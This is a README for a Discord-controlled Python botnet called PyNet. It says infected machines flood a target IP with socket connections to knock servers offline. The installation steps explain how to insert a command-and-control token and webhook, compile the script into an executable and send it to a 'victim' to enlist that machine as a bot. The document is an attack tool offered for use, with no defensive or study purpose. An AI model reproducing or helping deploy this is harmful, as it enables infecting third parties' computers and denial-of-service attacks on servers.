# PyNet
> *A botnet running on discord servers*

# How it works
It works by attempting to make a connection to the target IP with socket
this will act as a ping requests like a traditional BotNet, the more bots
the more requests to your given IP meaning more stress and inturn making 
it more likely to boot a server.


# Installation
1. Download the repository and extract it to a folder
2. Open a command shell in that folder
3. Run the command pip install -r requirements.txt
5. Put the bot of the token for your CNC server in the main.py
6. Same with the webhook
7. Compile the main.py with pyinstalelr or nutika
8. Send that file to the victim
9. You now have your first bot on your server
